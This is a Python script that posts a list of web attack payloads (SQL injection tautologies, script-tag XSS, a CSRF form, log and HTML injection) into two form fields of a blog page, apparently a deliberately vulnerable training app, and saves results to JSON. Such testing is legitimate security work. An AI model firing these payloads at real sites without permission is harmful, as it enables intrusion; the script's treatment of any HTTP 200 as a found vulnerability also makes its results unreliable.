import requests
import sys
import time
import json
from datetime import datetime
from pathlib import Path
import os

# Directory for .json logs
logs_dir = Path('logs')

if len(sys.argv) > 2:
    base_url = sys.argv[1]  # Receives the base URL as the script argument
    request_rate = sys.argv[2]  # Receives the request rate as the second argument
else:
    print("Base URL and/or request rate were not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 7, 'medium': 2, 'high': 0.5}
delay = delays.get(request_rate, 2)  # Default to 'medium' if rate is unrecognized

# Construct the target URL using the base URL and page name
target_url = f"{base_url}/index.php?page=add-to-your-blog.php"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

# List of fields to test
form_fields = ['blog_entry', 'logged_in_user_name']

# Dictionary with payloads for each type of vulnerability
payloads = {
    'SQL Injection': "' OR '1'='1",
    'XSS': "<script>alert('XSS')</script>",
    'Cross Site Request Forgery (CSRF)': "<form action='vulnerable_page_url' method='POST'><input type='hidden' name='vulnerable_field' value='malicious_value' /><input type='submit' /></form>",
    'JavaScript Validation Bypass': "admin' --; <script>document.forms[0].submit();</script>",
    'HTML Injection in Blog Input Field': "<h1>Injected HTML Content</h1>",
    'Application Exception Output': "' UNION SELECT throw_error('Exception Output') --",
    'Application Log Injection': "username=admin&password=admin123\n[Injected Log Entry]",
    'Known Vulnerable Output: Name': "' OR '1'='1 --",
    'Known Vulnerable Output: Comment': "<script>alert('Vulnerable Output in Comment');</script>",
    'Known Vulnerable Output: Add Blog for Title': "<script>alert('Vulnerable Output in Add Blog for Title');</script>"
}

# Counters for test results
total_tests = 0
tests_passed = 0
tests_failed = 0

detailed_tests = []
# Perform tests
for field in form_fields:
    for vulnerability_type, payload in payloads.items():
        form_data = {f: 'test' for f in form_fields}  # All fields with 'test'
        
        # Specify which field should receive the payload, if necessary
        if "in Blog Input Field" in vulnerability_type:
            specific_field = 'blog_entry'  # Assuming 'blog_entry' as blog field
        else:
            specific_field = field

        form_data[specific_field] = payload  # Current field with the payload

        total_tests += 1

        # Send the request
        test_response = requests.post(target_url, data=form_data, headers=headers)
        
        test_detail = {
            'field': field,
            'vulnerability_type': vulnerability_type,
            'payload': payload,
            'passed': test_response.status_code == 200,
            'status_code': test_response.status_code
        }
        detailed_tests.append(test_detail)
        

        # Check if the test was successful using the status code
        if test_response.status_code == 200:
            print(f"Test #{total_tests} PASSED: Vulnerability '{vulnerability_type}' possibly found in field '{specific_field}'!")
            tests_passed += 1
        else:
            print(f"Test #{total_tests} FAILED: Status code {test_response.status_code}.")
            tests_failed += 1

        time.sleep(delay)  # Add a pause between requests based on request rate

# Report final results
print(f"\nTotal Tests: {total_tests}")
print(f"Tests Passed: {tests_passed}")
print(f"Tests Failed: {tests_failed}")
print(f"Tested URL: {target_url}")

#-------------------------Part for data acquisition--------------------------------------- 
# Save results to a JSON file
results = {
    'date_time': datetime.now().strftime("%Y-%m-%d_%H-%M-%S"),
    'base_url': base_url,
    'total_tests': total_tests,
    'tests_passed': tests_passed,
    'tests_failed': tests_failed,
    'tested_url': target_url,
    'detailed_tests': detailed_tests
}

# Get the name of the current script
script_name = os.path.splitext(os.path.basename(__file__))[0]

file_name = f"results_{script_name}_{results['date_time']}.json"
full_file_path = logs_dir.joinpath(file_name)

with open(full_file_path, 'w') as file:
    json.dump(results, file, indent=4)

print(f"\nResults saved in {full_file_path}")